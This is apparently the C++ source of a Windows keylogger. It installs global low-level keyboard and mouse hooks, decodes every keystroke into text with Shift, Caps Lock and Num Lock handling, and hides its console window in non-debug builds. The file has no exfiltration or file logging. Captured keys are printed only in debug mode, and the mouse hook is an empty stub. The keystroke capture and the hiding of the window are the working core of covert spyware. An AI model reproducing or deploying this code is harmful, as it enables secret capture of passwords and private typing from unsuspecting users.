//C++ Headers
#include <windows.h>
#include <winuser.h>

//C Headers
#include <stdio.h>

#define DEBUG 1

//Debug Headers
#ifdef DEBUG
    #include <iostream>
#endif

//Global variables
HHOOK mousehook;
HHOOK keyboardhook;
KBDLLHOOKSTRUCT kbd_struct;
MSLLHOOKSTRUCT mouse_struct;


//Callback functions
LRESULT WINAPI HookMouseCallback(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT WINAPI HookKeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam);


void StealthConsole();
void SetMouseHook();
void SetKeyboardHook();
void SetHooks();
void ReleaseMouseHook();
void ReleaseKeyboardHook();
void ReleaseHooks();
bool IfPrintable(char* str);


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    MSG msg;

    SetHooks();
    StealthConsole();

    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return msg.wParam;
}

LRESULT CALLBACK HookMouseCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {

        mouse_struct = *((MSLLHOOKSTRUCT*)lParam);

        switch (wParam) {
            case WM_LBUTTONDOWN:
            // std::cout << "Left mouse click\n";
            break;

            case WM_LBUTTONUP:
            // std::cout << "Left mouse unclick\n";
            break;
        }
    }

    return CallNextHookEx(mousehook, nCode, wParam, lParam);
}

LRESULT CALLBACK HookKeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        static bool capslock = GetKeyState(VK_CAPITAL);
        static bool shift = false;
        static bool numlock = GetKeyState(VK_NUMLOCK);
        bool shortcut = false;
        kbd_struct = *((KBDLLHOOKSTRUCT*)lParam);
        char str[0xFF] = {0};
        DWORD msg = 1;
        bool printable;

        //Bits position from docs
        msg += (kbd_struct.scanCode << 16);
        if (kbd_struct.vkCode == 0xA1) {
            msg += ((kbd_struct.flags^LLKHF_EXTENDED) << 24);
        }
        else {
            msg += (kbd_struct.flags << 24);
        }
        GetKeyNameText(msg, str, 0xFF);
        // std::cout << "DEBUG:\t" << str << "\tvk:\t" << kbd_struct.vkCode << "\tscan:\t" << kbd_struct.scanCode << "\tflag:\t" << kbd_struct.flags << "\n";   
        // std::cout << "TEST:\t" << (kbd_struct.flags & LLKHF_EXTENDED) << /*"\txor:\t" << (kbd_struct.flags ^ LLKHF_EXTENDED) <<*/ "\n";    

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            // std::cout << "\nDEBUG: " << str << "\n Caps: " << capslock << "\n Shift: " << shift << "\n";
            printable = IfPrintable(str);

            if (!printable) {
                if (strcmp(str, "Caps Lock") == 0) {
                    capslock = !capslock;
                }
                else if ((strcmp(str, "Shift") == 0) || (strcmp(str, "Right Shift") == 0)) {   // RIGHT SHIFT NOT WORKING
                    shift = true;
                }
                else if (strcmp(str, "Num Lock") == 0) {
                    numlock = !numlock;
                }

                if ((strcmp(str, "Enter") == 0) || (strcmp(str, "Num Enter") == 0)) {
                    strncpy(str, "\n", 0xFF);
                    printable = true;
                    shortcut = true;
                }
                else if (strcmp(str, "Space") == 0) {
                    strncpy(str, " ", 0xFF);
                    printable = true;
                    shortcut = true;
                }
                else if (strcmp(str, "Tab") == 0) {
                    strncpy(str, "\t", 0xFF);
                    printable = true;
                    shortcut = true;
                }
                else {
                    char tmp[0xFF] = {0};
                    snprintf(tmp, 0xFF, "[%s]", str);
                    strncpy(str, tmp, 0xFF);
                }
                //Cause there is no known method to me to map it automatically,
                //I have to do it manually
                //Not using C++ map, bcs of binary size
                if (numlock && !shortcut) {
                    if (strcmp(str, "[Num 0]") == 0) {
                        strncpy(str, "0", 0xFF);
                    }
                    else if (strcmp(str, "[Num 1]") == 0) {
                        strncpy(str, "1", 0xFF);
                    }
                    else if (strcmp(str, "[Num 2]") == 0) {
                        strncpy(str, "2", 0xFF);
                    }
                    else if (strcmp(str, "[Num 3]") == 0) {
                        strncpy(str, "3", 0xFF);
                    }
                    else if (strcmp(str, "[Num 4]") == 0) {
                        strncpy(str, "4", 0xFF);
                    }
                    else if (strcmp(str, "[Num 5]") == 0) {
                        strncpy(str, "5", 0xFF);
                    }
                    else if (strcmp(str, "[Num 6]") == 0) {
                        strncpy(str, "6", 0xFF);
                    }
                    else if (strcmp(str, "[Num 7]") == 0) {
                        strncpy(str, "7", 0xFF);
                    }
                    else if (strcmp(str, "[Num 8]") == 0) {
                        strncpy(str, "8", 0xFF);
                    }
                    else if (strcmp(str, "[Num 9]") == 0) {
                        strncpy(str, "9", 0xFF);
                    }
                    else if (strcmp(str, "[Num Del]") == 0) {
                        strncpy(str, "[,]", 0xFF);
                    }
                    else if (strcmp(str, "[Num +]") == 0) {
                        strncpy(str, "+", 0xFF);
                    }
                    else if (strcmp(str, "[Num -]") == 0) {
                        strncpy(str, "-", 0xFF);
                    }
                    else if (strcmp(str, "[Num *]") == 0) {
                        strncpy(str, "*", 0xFF);
                    }
                    else if (strcmp(str, "[Num /]") == 0) {
                        strncpy(str, "/", 0xFF);
                    }
                }
                else if (!shortcut) {
                    if (strcmp(str, "[Num 0]") == 0) {
                        strncpy(str, "[Insert]", 0xFF);
                    }
                    else if (strcmp(str, "[Num 1]") == 0) {
                        strncpy(str, "[End]", 0xFF);
                    }
                    else if (strcmp(str, "[Num 2]") == 0) {
                        strncpy(str, "[Down]", 0xFF);
                    }
                    else if (strcmp(str, "[Num 3]") == 0) {
                        strncpy(str, "[Page Down]", 0xFF);
                    }
                    else if (strcmp(str, "[Num 4]") == 0) {
                        strncpy(str, "[Left]", 0xFF);
                    }
                    else if (strcmp(str, "[Num 5]") == 0) {
                        strncpy(str, "[]", 0xFF);
                    }
                    else if (strcmp(str, "[Num 6]") == 0) {
                        strncpy(str, "[Right]", 0xFF);
                    }
                    else if (strcmp(str, "[Num 7]") == 0) {
                        strncpy(str, "[Home]", 0xFF);
                    }
                    else if (strcmp(str, "[Num 8]") == 0) {
                        strncpy(str, "[Up]", 0xFF);
                    }
                    else if (strcmp(str, "[Num 9]") == 0) {
                        strncpy(str, "[Page Up]", 0xFF);
                    }
                }
            }

            if (printable) {
                int val = int(str[0]);
                if (((val >= 65) && (val <= 90)) || (val >= 97 && val <= 122)) {
                    if (shift == capslock) {
                        str[0] = tolower(str[0]);
                    }
                    else {
                        str[0] = toupper(str[0]);
                    }
                }
                else {
                    if (shift) {
                        //Same situation - function now available, map too big
                        if (strcmp(str, "1") == 0) {
                            strncpy(str, "!", 0xFF);
                        }
                        else if (strcmp(str, "2") == 0) {
                            strncpy(str, "@", 0xFF);
                        }
                        else if (strcmp(str, "3") == 0) {
                            strncpy(str, "#", 0xFF);
                        }
                        else if (strcmp(str, "4") == 0) {
                            strncpy(str, "$", 0xFF);
                        }
                        else if (strcmp(str, "5") == 0) {
                            strncpy(str, "%", 0xFF);
                        }
                        else if (strcmp(str, "6") == 0) {
                            strncpy(str, "^", 0xFF);
                        }
                        else if (strcmp(str, "7") == 0) {
                            strncpy(str, "&", 0xFF);
                        }
                        else if (strcmp(str, "8") == 0) {
                            strncpy(str, "*", 0xFF);
                        }
                        else if (strcmp(str, "9") == 0) {
                            strncpy(str, "(", 0xFF);
                        }
                        else if (strcmp(str, "0") == 0) {
                            strncpy(str, ")", 0xFF);
                        }
                        else if (strcmp(str, "-") == 0) {
                            strncpy(str, "_", 0xFF);
                        }
                        else if (strcmp(str, "=") == 0) {
                            strncpy(str, "+", 0xFF);
                        }
                        else if (strcmp(str, "[") == 0) {
                            strncpy(str, "{", 0xFF);
                        }
                        else if (strcmp(str, "]") == 0) {
                            strncpy(str, "}", 0xFF);
                        }
                        else if (strcmp(str, "\\") == 0) {
                            strncpy(str, "|", 0xFF);
                        }
                        else if (strcmp(str, ";") == 0) {
                            strncpy(str, ":", 0xFF);
                        }
                        else if (strcmp(str, "'") == 0) {
                            strncpy(str, "\"", 0xFF);
                        }
                        else if (strcmp(str, ",") == 0) {
                            strncpy(str, "<", 0xFF);
                        }
                        else if (strcmp(str, ".") == 0) {
                            strncpy(str, ">", 0xFF);
                        }
                        else if (strcmp(str, "/") == 0) {
                            strncpy(str, "?", 0xFF);
                        }
                    }
                }
            }
#ifdef DEBUG
            std::cout << str;
#endif
        }
        else if(wParam == WM_KEYUP) {
            if ((strcmp(str, "Shift") == 0) || (strcmp(str, "Right Shift") == 0)) {
                shift = false;
            }
        }
    }

    return CallNextHookEx(keyboardhook, nCode, wParam, lParam);
}

void StealthConsole() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    
#ifdef DEBUG
    ShowWindow(stealth, SW_SHOWNORMAL); 
#else
    ShowWindow(stealth, SW_HIDE); 
#endif
}

void SetMouseHook() {
    if (!(mousehook = SetWindowsHookEx(WH_MOUSE_LL, HookMouseCallback, NULL, 0))) {
#ifdef DEBUG
        std::cout << "Failed to install mouse hook!\n";
#endif
    }
}

void SetKeyboardHook() {
    if (!(keyboardhook = SetWindowsHookEx(WH_KEYBOARD_LL, HookKeyboardCallback, NULL, 0))) {
#ifdef DEBUG
        std::cout << "Failed to install keyboard hook!\n";
#endif
    }
}

void SetHooks() {
    SetMouseHook();
    SetKeyboardHook();
}

void ReleaseMouseHook() {
    UnhookWindowsHookEx(mousehook);
}

void ReleaseKeyboardHook() {
    UnhookWindowsHookEx(keyboardhook);
}

void ReleaseHooks() {
    ReleaseMouseHook();
    ReleaseKeyboardHook();
}

bool IfPrintable(char* str) {
    return ((strlen(str) <= 1) ? true : false);
}